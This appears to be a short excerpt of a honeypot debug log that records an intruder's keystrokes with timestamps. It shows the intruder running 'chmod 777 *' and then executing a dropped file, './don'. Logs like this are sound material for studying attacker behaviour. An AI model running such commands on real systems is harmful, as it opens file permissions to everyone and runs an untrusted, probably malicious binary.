+2019-11-14 07:13:08.891 - [Debug] [SHELL] Attacker Keystroke: h
+2019-11-14 07:13:09.076 - [Debug] [SHELL] Attacker Keystroke: m
+2019-11-14 07:13:09.252 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:13:09.419 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:13:09.540 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:13:09.798 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2019-11-14 07:13:10.164 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2019-11-14 07:13:10.931 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:13:11.203 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:13:11.396 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:13:11.571 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:13:11.723 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:13:11.845 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:13:12.387 - [Debug] [SHELL] Attacker Keystroke: (
+2019-11-14 07:13:13.131 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2019-11-14 07:13:13.435 - [Debug] [SHELL] Attacker Keystroke: *
+2019-11-14 07:13:13.995 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:13:13.997 - [Debug] [SHELL] line from reader: chmod 777 *
+2019-11-14 07:13:13.997 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,32,100,127,127,100,32,55,55,55,32,40,127,42,13
+2019-11-14 07:13:14.579 - [Debug] [SHELL] Attacker Keystroke: [ESC]OA
+2019-11-14 07:13:14.763 - [Debug] [SHELL] Attacker Keystroke: [ESC]OA
+2019-11-14 07:13:15.324 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:13:15.327 - [Debug] [SHELL] line from reader: ./don
+2019-11-14 07:13:15.327 - [Debug] [SHELL] Keystroke buffer: 27,79,65,27,79,65,13
+2019-11-14 07:13:50.018 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:13:50.650 - [Debug] [SHELL] Attacker Keystroke: [DEL]
